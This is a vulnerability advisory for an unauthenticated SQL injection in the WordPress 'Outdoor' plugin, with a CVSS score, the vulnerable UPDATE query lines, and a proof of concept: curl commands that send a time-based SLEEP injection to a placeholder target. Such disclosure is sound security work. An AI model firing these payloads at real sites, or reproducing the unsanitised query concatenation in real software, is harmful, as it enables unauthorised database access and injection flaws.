# CVE-2025-10743: Unauthenticated SQLi in WordPress 'Outdoor' plugin
The Outdoor WordPress plugin contains an unauthenticated SQL injection vulnerability in the `actions.php` file. The vulnerability occurs in the edit action handler where user-supplied `POST` parameters are directly concatenated into SQL queries without proper sanitization. Specifically, the 'field' and 'value' parameters from `$_POST["field"]` and `$_POST["value"]` are inserted directly into UPDATE queries, allowing attackers to inject arbitrary SQL commands without authentication.

## CVSS v3.1 Score: 7.5 (High)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Proof of Concept
1. Install latest version of WordPress 

2. Install 'Outdoor' plugin v1.3.2 via WordPress plugin browser, or via https://wordpress.org/plugins/outdoor (note, as of October 14, 2025 the plugin was closed by WordPress following the disclosure of this vulnerability) 

3. Populate SQL table (if empty on fresh install)
```
curl -X POST "http://[target-site]/wp-admin/admin.php?page=outdoor" -d "outd_add_media=1"
```

4. Execute Time-based SQL Injection
```
curl -X POST "http://[target-site]/wp-admin/admin.php?page=outdoor" -d "action_row=edit&field=outdoor_status&value=test&id_row=(SELECT SLEEP(5)) OR outdoor_id>=0"
```

## Vulnerable Code: 
```
/wp-content/plugins/outdoor/actions.php
Line 72: $wpdb->query("UPDATE $outd_table_name SET $outd_field = '$outd_value' WHERE outdoor_id = $outd_id");
Line 69: $wpdb->query("UPDATE $outd_table_name SET outdoor_order = outdoor_order + 1 WHERE outdoor_order >= $outd_value");
```
